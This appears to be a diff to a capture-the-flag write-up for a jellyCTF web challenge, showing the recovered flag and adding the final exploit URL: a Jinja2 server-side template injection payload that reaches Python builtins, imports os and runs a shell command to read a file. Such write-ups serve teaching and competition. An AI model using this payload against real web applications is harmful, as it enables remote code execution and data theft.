@@ -22,3 +22,5 @@ And there is our flag!
 
 Final flag: `jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}`
 
+Final payload: `https://bro-visited-his-site.jellyc.tf/response?word={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /app/flag.txt").read()}}{%endif%}{% endfor %}`
+
